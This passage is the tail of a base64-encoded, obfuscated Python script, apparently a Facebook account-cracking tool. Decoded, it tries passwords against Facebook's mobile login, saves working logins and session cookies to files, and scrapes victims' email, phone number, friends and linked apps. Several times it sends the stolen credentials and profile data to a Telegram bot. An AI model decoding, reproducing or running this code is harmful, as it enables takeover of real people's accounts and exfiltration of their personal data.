mlnaW4iLCJzZWMtZmV0Y2gtbW9kZSI6ImNvcnMiLCJzZWMtZmV0Y2gtdXNlciI6ImVtcHR5Iiwic2VjLWZldGNoLWRlc3QiOiJkb2N1bWVudCIsInJlZmVyZXIiOiJodHRwczovL20uZmFjZWJvb2suY29tL2luZGV4LnBocD9uZXh0PWh0dHBzJTNBJTJGJTJGZGV2ZWxvcGVycy5mYWNlYm9vay5jb20lMkZ0b29scyUyRmRlYnVnJTJGYWNjZXNzdG9rZW4lMkYiLCJhY2NlcHQtZW5jb2RpbmciOiJnemlwLCBkZWZsYXRlIGJyIiwiYWNjZXB0LWxhbmd1YWdlIjoiZW4tR0IsZW4tVVM7cT0wLjksZW47cT0wLjgifSkKCQkJcG8gPSBzZXMucG9zdCgnaHR0cHM6Ly9tLmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvdmFsaWRhdGUtcGFzc3dvcmQvP3NoYmw9MCcsZGF0YT1kYXRhYSxhbGxvd19yZWRpcmVjdHM9RmFsc2UpCgkJCWlmICJjaGVja3BvaW50IiBpbiBwby5jb29raWVzLmdldF9kaWN0KCkua2V5cygpOgoJCQkJaWYgJ3lhJyBpbiBvcHJlazoKCQkJCQlha3VuLmFwcGVuZChpZGYrJ3wnK3B3KQoJCQkJCWNla2VyKGlkZixwdykKCQkJCWVsc2U6CgkJCQkJcHJpbnQoJ1xuJykKCQkJCQlzdGF0dXNjcCA9IGYnJyfwnZm18J2ZsPCdmbLwnZm08J2ZsfCdmb7wnZm+8J2ZuuKclu+4jwrii5jilIDilIDilIDilIDilIDilIHwk4ap2YXYr9mB2YjYufCThqrigI/ilIHilIDilIDilIDilIDilIDii5kK4p2WIC0g8J2QlPCdkJLwnZCE8J2QkfCdkI3wnZCA8J2QjCA6IHtpZGZ9XG4K4p2WIC0g8J2Qj/CdkIDwnZCS8J2QkvCdkJbwnZCR8J2QgyA6IHtwd31cbgrYrdiz2KfYqCDYs9mD2YrZiNixCuKLmOKUgOKUgOKUgOKUgOKUgOKUgfCThqnZhdiv2YHZiNi58JOGquKAj+KUgeKUgOKUgOKUgOKUgOKUgOKLmQpCWSA9IEBUVEw5VCB8JycnCgkJCQkJc3RhdHVzY3AxID0gbmVsKHN0YXR1c2NwLCBzdHlsZT0ncmVkJykKCQkJCQljZXRhayhuZWwoc3RhdHVzY3AxLCB0aXRsZT0nU0VTSScpKQoJCQkJCW9wZW4oJ0NQLycrY3BjLCdhJykud3JpdGUoaWRmKyd8JytwdysnXG4nKQoJCQkJCWFrdW4uYXBwZW5kKGlkZisnfCcrcHcpCgkJCQkJY3ArPTEKCQkJCQlyZXF1ZXN0cy5nZXQoImh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3QiK3N0cih0b2tlbikrIi9zZW5kTWVzc2FnZT9jaGF0X2lkPSIrc3RyKElEKSsiJnRleHQ9IitzdHIoc3RhdHVzY3ApKQoJCQkJYnJlYWsKCQkJZWxpZiAiY191c2VyIiBpbiBzZXMuY29va2llcy5nZXRfZGljdCgpLmtleXMoKToKCQkJCWhlYWRhcHA9eyJ1c2VyLWFnZW50IjoiTm9raWFYMi0wMS81LjAgKDA4LjM1KSBQcm9maWxlL01JRFAtMi4xIENvbmZpZ3VyYXRpb24vQ0xEQy0xLjEgTW96aWxsYS81LjAgQXBwbGVXZWJLaXQvNDIwKyAoS0hUTUwsIGxpa2UgR2Vja28pIFNhZmFyaS80MjArIn0KCQkJCWlmICdubycgaW4gdGFwbGlrYXNpOgoJCQkJCW9rKz0xCgkJCQkJY29raT1wby5jb29raWVzLmdldF9kaWN0KCkKCQkJCQlrdWtpID0gKCI7Iikuam9pbihbICIlcz0lcyIgJSAoa2V5LCB2YWx1ZSkgZm9yIGtleSwgdmFsdWUgaW4gc2VzLmNvb2tpZXMuZ2V0X2RpY3QoKS5pdGVtcygpIF0pCgkJCQkJb3BlbignT0svJytva2MsJ2EnKS53cml0ZShpZGYrJ3wnK3B3Kyd8JytrdWtpKydcbicpCgkJCQkJcHJpbnQoJ1xuJykKCQkJCQlzdGF0dXNvayA9IGYnJyfwnZm18J2ZsPCdmbLwnZm08J2ZsfCdmb7wnZm+8J2ZuuKclO+4jwrii5jilIDilIDilIDilIDilIDilIHwk4ap8J2QmPCdkIDwnZCS8J2QiPCdkJHwk4aq4oCP4pSB4pSA4pSA4pSA4pSA4pSA4ouZCuKdliAtIPCdkJTwnZCS8J2QhPCdkJHwnZCN8J2QgPCdkIwgOiB7aWRmfVxuCuKdliAtIPCdkI/wnZCA8J2QkvCdkJLwnZCW8J2QkfCdkIMgOiB7cHd9XG4KCuKLmOKUgOKUgOKUgOKUgOKUgOKUgfCThqnwnZCY8J2QgPCdkJLwnZCI8J2QkfCThqrigI/ilIHilIDilIDilIDilIDilIDii5kKQlkgPSBAVFRMOVQnJycKCQkJCQlzdGF0dXNvazEgPSBuZWwoc3RhdHVzb2ssIHN0eWxlPSdncmVlbicpCgkJCQkJY2V0YWsobmVsKHN0YXR1c29rMSwgdGl0bGU9JyBOTyBTRVNJJykpCgkJCQkJcmVxdWVzdHMuZ2V0KCJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90IitzdHIodG9rZW4pKyIvc2VuZE1lc3NhZ2U/Y2hhdF9pZD0iK3N0cihJRCkrIiZ0ZXh0PSIrc3RyKHN0YXR1c29rKSkKCQkJCQlicmVhawoJCQkJZWxpZiAneWEnIGluIHRhcGxpa2FzaToKCQkJCQlvays9MQoJCQkJCWNva2k9cG8uY29va2llcy5nZXRfZGljdCgpCgkJCQkJa3VraSA9ICgiOyIpLmpvaW4oWyAiJXM9JXMiICUgKGtleSwgdmFsdWUpIGZvciBrZXksIHZhbHVlIGluIHNlcy5jb29raWVzLmdldF9kaWN0KCkuaXRlbXMoKSBdKQoJCQkJCW9wZW4oJ09LLycrb2tjLCdhJykud3JpdGUoaWRmKyd8JytwdysnfCcra3VraSsnXG4nKQoJCQkJCXVzZXI9aWRmCgkJCQkJaW5mb2FrdW4gPSAiIgoJCQkJCXNlc3Npb24gPSByZXF1ZXN0cy5TZXNzaW9uKCkKCQkJCQlnZXRfaWQgPSBzZXNzaW9uLmdldCgiaHR0cHM6Ly9tLmZhY2Vib29rLmNvbS9wcm9maWxlLnBocCIsY29va2llcz1jb2tpLGhlYWRlcnM9aGVhZGFwcCkudGV4dAoJCQkJCW5hbWEgPSByZS5maW5kYWxsKCdcPHRpdGxlXD4oLio/KTxcL3RpdGxlXD4nLHN0cihnZXRfaWQpKVswXQoJCQkJCXJlc3BvbnNlID0gc2Vzc2lvbi5nZXQoImh0dHBzOi8vbS5mYWNlYm9vay5jb20vcHJvZmlsZS5waHA/dj1pbmZvIixjb29raWVzPWNva2ksaGVhZGVycz1oZWFkYXBwKS50ZXh0CgkJCQkJcmVzcG9uc2UyID0gc2Vzc2lvbi5nZXQoImh0dHBzOi8vbS5mYWNlYm9vay5jb20vcHJvZmlsZS5waHA/dj1mcmllbmRzIixjb29raWVzPWNva2ksaGVhZGVycz1oZWFkYXBwKS50ZXh0CgkJCQkJcmVzcG9uc2UzID0gc2Vzc2lvbi5nZXQoZiJodHRwczovL20uZmFjZWJvb2suY29tL3t1c2VyfS9hbGxhY3Rpdml0eS8/Y2F0ZWdvcnlfa2V5PWFsbCZzZWN0aW9uX2lkPXllYXJfMjAyMiZ0aW1lc3RhcnQ9MTYwOTQ4ODAwMCZ0aW1lZW5kPTE2NDEwMjM5OTkmc2VjdGlvbkxvYWRpbmdJRD1tX3RpbWVsaW5lX2xvYWRpbmdfZGl2XzE2NDEwMjM5OTlfMTYwOTQ4ODAwMF84XyIsY29va2llcz1jb2tpLGhlYWRlcnM9aGVhZGFwcCkudGV4dAoJCQkJCXJlc3BvbnNlNCA9IHNlc3Npb24uZ2V0KGYiaHR0cHM6Ly9tLmZhY2Vib29rLmNvbS90aW1lbGluZS9hcHBfY29sbGVjdGlvbi8/Y29sbGVjdGlvbl90b2tlbj17dXNlcn0lM0ExODQ5ODUwNzE1MzgwMDIlM0EzMiZfcmRjPTEmX3JkciIsY29va2llcz1jb2tpLGhlYWRlcnM9aGVhZGFwcCkudGV4dAoJCQkJCXRyeTpub21lciA9IHJlLmZpbmRhbGwoJ1w8YVwgaHJlZlw9XCJ0ZWxcOlwrLio/XCI+XDxzcGFuXCBkaXJcPVwibHRyXCI+KC4qPyk8XC9zcGFuPjxcL2E+JyxzdHIocmVzcG9uc2UpKVswXQoJCQkJCWV4Y2VwdDpub21lciA9ICIiCgkJCQkJdHJ5OmVtYWlsID0gcmUuZmluZGFsbCgnXDxhIGhyZWZcPVwiaHR0cHNcOlwvXC9sbVwuZmFjZWJvb2tcLmNvbVwvbFwucGhwXD91XD1tYWlsLio/XCIgdGFyZ2V0XD1cIi4qP1wiXD4oLio/KTxcL2FcPicsc3RyKHJlc3BvbnNlKSlbMF0ucmVwbGFjZSgnJiMwNjQ7JywnQCcpCgkJCQkJZXhjZXB0OmVtYWlsPSIiCgkJCQkJdHJ5OnR0bCA9IHJlLmZpbmRhbGwoJ1w8XC90ZFw+XDx0ZFwgdmFsaWduXD1cInRvcFwiIGNsYXNzXD1cIi4qP1wiXD5cPGRpdlwgY2xhc3NcPVwiLio/XCJcPihcZCtccytcdytccytcZCspPFwvZGl2XD5cPFwvdGRcPlw8XC90clw+JyxzdHIocmVzcG9uc2UpKVswXQoJCQkJCWV4Y2VwdDp0dGw9IiIKCQkJCQl0cnk6dGVtYW4gPSByZS5maW5kYWxsKCdcPGgzXCBjbGFzc1w9XCIuKj9cIlw+VGVtYW5cIFwoKC4qPylcKTxcL2gzXD4nLHN0cihyZXNwb25zZTIpKVswXQoJCQkJCWV4Y2VwdDp0ZW1hbiA9ICIiCgkJCQkJdHJ5OnBlbmdpa3V0ID0gcmUuZmluZGFsbCgnXDxzcGFuXCBjbGFzc1w9XCIuKj9cIlw+KC4qPylcPFwvc3Bhblw+JyxzdHIocmVzcG9uc2U0KSlbMV0KCQkJCQlleGNlcHQ6cGVuZ2lrdXQgPSAiIgoJCQkJCXRyeToKCQkJCQkJdGFodW4gPSAiIgoJCQkJCQljZWtfdGhuID0gcmUuZmluZGFsbCgnXDxkaXZcIGNsYXNzXD1cIi4qP1wiIGlkXD1cInllYXJfKC4qPylcIj4nLHN0cihyZXNwb25zZTMpKQoJCQkJCQlmb3IgbmVuZW4gaW4gY2VrX3RobjoKCQkJCQkJCXRhaHVuICs9IG5lbmVuKyIsICIKCQkJCQlleGNlcHQ6cGFzcwoKCQkJCQlpbmZvYWt1biArPSBmJycn2K7YttixINis2KfYqNmE2YMg2K3Ys9in2Kgg2LXYrdmK2K0g2KrYudin2YQgCuKLmOKUgOKUgOKUgOKUgOKUgOKUgfCThqnwnZCY8J2QgPCdkJLwnZCI8J2QkfCThqrigI/ilIHilIDilIDilIDilIDilIDii5kK4p2WIC0g8J2QlPCdkJLwnZCE8J2QkfCdkI3wnZCA8J2QjCA6IHtpZGZ9XG7inZYgLSDwnZCP8J2QgPCdkJLwnZCS8J2QlvCdkJHwnZCDIDoge3B3fVxuPD48Pjw+PD48Pjw+PD48Pjw+PD48Pjw+PD48Plxu4p2WIC0gSnVtbGFoIFRlbWFuIDoge3RlbWFufVxu4p2WIC0gSnVtbGFoIFBlbmdpa3V0IDoge3Blbmdpa3V0fVxu4p2WIC0gRW1haWwgQWt0aWYgOiB7ZW1haWx9XG7inZYgLSBOb21vciBBa3RpZiA6IHtub21lcn1cbuKdliAtIFRhaHVuIEFrdW4gOiB7dGFodW59XG7inZYgLSBUYW5nZ2FsIExhaGlyIDoge3R0bH1cbgrii5jilIDilIDilIDilIDilIDilIHwk4ap8J2QmPCdkIDwnZCS8J2QiPCdkJEg8JOGquKAj+KUgeKUgOKUgOKUgOKUgOKUgOKLmQpCWSA9IEBUVEw5VCAnJycKCQkJCQlyZXF1ZXN0cy5nZXQoImh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3QiK3N0cih0b2tlbikrIi9zZW5kTWVzc2FnZT9jaGF0X2lkPSIrc3RyKElEKSsiJnRleHQ9IitzdHIoaW5mb2FrdW4pKQoKCQkJCQloaXQxLCBoaXQyID0gMCwwCgkJCQkJY2VrID1zZXNzaW9uLmdldCgiaHR0cHM6Ly9tLmZhY2Vib29rLmNvbS9zZXR0aW5ncy9hcHBzL3RhYmJlZC8/dGFiPWFjdGl2ZSIsY29va2llcz1jb2tpLGhlYWRlcnM9aGVhZGFwcCkudGV4dAoJCQkJCWNlazIgPSBzZXNzaW9uLmdldCgiaHR0cHM6Ly9tLmZhY2Vib29rLmNvbS9zZXR0aW5ncy9hcHBzL3RhYmJlZC8/dGFiPWluYWN0aXZlIixjb29raWVzPWNva2ksaGVhZGVycz1oZWFkYXBwKS50ZXh0CgkJCQkJaWYgIkRpYWtzZXMgbWVuZ2d1bmFrYW4gRmFjZWJvb2siIGluIHJlLmZpbmRhbGwoIlw8dGl0bGVcPiguKj8pPFwvdGl0bGVcPiIsc3RyKGNlaykpOgoJCQkJCQlpbmZvYWt1biArPSAoZiJBcGxpa2FzaSBZYW5nIFRlcmthaXQqXG4iKQoJCQkJCQlpZiAiQW5kYSB0aWRhayBtZW1pbGlraSBhcGxpa2FzaSBhdGF1IHNpdHVzIHdlYiBha3RpZiB1bnR1ayBkaXRpbmphdS4iIGluIGNlazoKCQkJCQkJCWluZm9ha3VuICs9IChmIlRpZGFrIEFkYSBBcGxpa2FzaSBBa3RpZiBZYW5nIFRlcmthaXQgKlxuIikKCQkJCQkJZWxzZToKCQkJCQkJCWluZm9ha3VuICs9IChmIglBcGxpa2FzaSBBa3RpZiA6IFxuIikKCQkJCQkJCWFwa0FrdGlmID0gcmUuZmluZGFsbCgnXC8+PGRpdlwgY2xhc3NcPVwiLio/XCJcPlw8c3BhblwgY2xhc3NcPVwiLio/XCJcPiguKj8pPFwvc3Bhblw+JyxzdHIoY2VrKSkKCQkJCQkJCWRpdGFtYmFoa2FuID0gcmUuZmluZGFsbCgnXDxkaXZcPlw8XC9kaXZcPlw8ZGl2XCBjbGFzc1w9XCIuKj9cIlw+KC4qPyk8XC9kaXZcPicsc3RyKGNlaykpCgkJCQkJCQlmb3IgbXVuY3VsIGluIGFwa0FrdGlmOgoJCQkJCQkJCWhpdDErPTEKCQkJCQkJCQlpbmZvYWt1biArPSAoZiIJCVt7aGl0MX1dIHttdW5jdWx9IHtkaXRhbWJhaGthbltoaXQyXX1cbiIpCgkJCQkJCQkJaGl0Mis9MQoJCQkJCQlpZiAiQW5kYSB0aWRhayBtZW1pbGlraSBhcGxpa2FzaSBhdGF1IHNpdHVzIHdlYiBrZWRhbHV3YXJzYSB1bnR1ayBkaXRpbmphdSIgaW4gY2VrMjoKCQkJCQkJCWluZm9ha3VuICs9IChmIlxuVGlkYWsgQWRhIEFwbGlrYXNpIEtlZGFsdXdhcnNhIFlhbmcgVGVya2FpdFxuIikKCQkJCQkJZWxzZToKCQkJCQkJCWhpdDEsaGl0Mj0wLDAKCQkJCQkJCWluZm9ha3VuICs9IChmIglBcGxpa2FzaSBLZWRhbHV3YXJzYSA6XG4iKQoJCQkJCQkJYXBrS2FkYWx1YXJzYSA9IHJlLmZpbmRhbGwoJ1wvPjxkaXZcIGNsYXNzXD1cIi4qP1wiXD5cPHNwYW5cIGNsYXNzXD1cIi4qP1wiXD4oLio/KTxcL3NwYW5cPicsc3RyKGNlazIpKQoJCQkJCQkJa2FkYWx1YXJzYSA9IHJlLmZpbmRhbGwoJ1w8ZGl2XD5cPFwvZGl2XD5cPGRpdlwgY2xhc3NcPVwiLio/XCJcPiguKj8pPFwvZGl2XD4nLHN0cihjZWsyKSkKCQkJCQkJCWZvciBtdW5jdWwgaW4gYXBrS2FkYWx1YXJzYToKCQkJCQkJCQloaXQxKz0xCgkJCQkJCQkJaW5mb2FrdW4gKz0gKGYiCQlbe2hpdDF9XSB7bXVuY3VsfSB7a2FkYWx1YXJzYVtoaXQyXX1cbiIpCgkJCQkJCQkJaGl0Mis9MQoJCQkJCWVsc2U6cGFzcwoJCQkJCXByaW50KCdcbicpCgkJCQkJc3RhdHVzb2sgPSBmJycnCQkJCQkKICAgXG57aW5mb2FrdW59CQkJCQkKCQkJCQknJycKCQkJCQlzdGF0dXNvazEgPSBuZWwoc3RhdHVzb2ssIHN0eWxlPSdncmVlbicpCgkJCQkJY2V0YWsobmVsKHN0YXR1c29rMSwgdGl0bGU9J09LJykpCgkJCQkJI3JlcXVlc3RzLmdldCgiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdCIrc3RyKHRva2VuKSsiL3NlbmRNZXNzYWdlP2NoYXRfaWQ9IitzdHIoSUQpKyImdGV4dD0iK3N0cihzdGF0dXNvaykpCgkJCQkJYnJlYWsKCgoJCQllbHNlOgoJCQkJY29udGludWUKCQlleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5Db25uZWN0aW9uRXJyb3I6CgkJCXRpbWUuc2xlZXAoMzEpCglsb29wKz0xCmRlZiBPKCk6Cgl0cnk6CgkJb3MucmVtb3ZlKCdJRC50eHQnKQoJCW9zLnJlbW92ZSgnb2suY29raS50eHQnKQoJCW9zLnJlbW92ZSgnLnRva2VuLnR4dCcpCgkJb3MucmVtb3ZlKCcuY29rLnR4dCcpCgkJCglleGNlcHQgRmlsZU5vdEZvdW5kRXJyb3IgYXMgZXJyb3I6CgkJCgkJCgkJZXhpdCgpCgkJCgkJCgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS1bIFlBU0lSIF0tLS0tLS0tLS0tLS0tLS0tLS0tLSMKaWYgX19uYW1lX189PSdfX21haW5fXyc6Cgl0cnk6b3Muc3lzdGVtKCdnaXQgcHVsbCcpCglleGNlcHQ6cGFzcwoJdHJ5Om9zLm1rZGlyKCdPSycpCglleGNlcHQ6cGFzcwoJdHJ5Om9zLm1rZGlyKCdDUCcpCglleGNlcHQ6cGFzcwoJdHJ5Om9zLm1rZGlyKCcvc2RjYXJkL0FMVklOTy1EVU1QJykKCWV4Y2VwdDpwYXNzCgl0cnk6b3Muc3lzdGVtKCd0b3VjaCAucHJveC50eHQnKQoJZXhjZXB0OnBhc3MKCXRyeTpvcy5zeXN0ZW0oJ3BrZyBpbnN0YWxsIHBsYXktYXVkaW8nKQoJZXhjZXB0OnBhc3MKCXRyeTpvcy5zeXN0ZW0oJ2NsZWFyJykKCWV4Y2VwdDpwYXNzCgkKCUxvZ2luKCkKCg=='))